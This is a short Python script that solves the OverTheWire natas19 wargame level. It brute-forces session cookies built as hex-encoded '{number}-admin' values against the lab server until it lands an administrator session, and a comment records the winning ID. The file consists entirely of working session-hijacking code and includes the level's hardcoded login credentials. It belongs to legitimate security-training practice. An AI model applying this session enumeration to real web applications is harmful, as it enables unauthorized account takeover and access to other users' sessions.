import requests

maxSessionIDs=640

basicAuth=requests.auth.HTTPBasicAuth('natas19','tnwER7PdfWkxsG4FNWUtoAZ9VyZTJqJr')
u="http://natas19.natas.labs.overthewire.org/"

payload={
    'username':"admin",
    'password':"admin"
}

#run through all possible sessionIDs and find which one is admin. Here the cookie is hex-encode of "{sessionID}-admin"
for i in range(0,maxSessionIDs+1):
    phpsessid=str((f"{str(i)}-admin").encode("utf-8").hex())
    sessionIDCookie={"PHPSESSID":phpsessid}
    response=requests.post(u,data=payload,auth=basicAuth,cookies=sessionIDCookie)
    print(f"Checking ID: {i}\t Cookie: {phpsessid}")
    if "regular user" not in response.text:
        print(response.text)
        break

#Session ID:281, Cookie: 3238312d61646d696e